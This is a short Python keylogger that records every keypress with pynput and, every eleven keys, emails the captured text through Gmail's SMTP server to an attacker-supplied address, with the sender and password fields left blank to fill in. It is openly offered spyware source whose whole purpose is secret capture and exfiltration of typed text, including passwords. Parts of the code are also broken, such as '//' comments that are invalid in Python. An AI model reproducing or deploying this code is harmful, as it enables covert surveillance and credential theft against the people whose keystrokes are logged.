import pynput
from pynput.keyboard import Key, Listener
from email.message import EmailMessage
import ssl
import smtplib

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
    sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False
def sendEmail(message):
    email_sender = ''         //enter sender mail address
    email_password=""         //enter app password created for gmail(sender address)
    email_receiver=''          //enter receiver mail address
    subject="!!KEY!!"
    body="**WARNING**"
    em=EmailMessage()
    em['From']=email_sender
    em['To']=email_receiver
    em['subject']=subject
    em.set_content(message)
    context=ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465 ,context=context) as smtp:
        smtp.login(email_sender,email_password)
        smtp.sendmail(email_sender , email_receiver ,em.as_string())

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
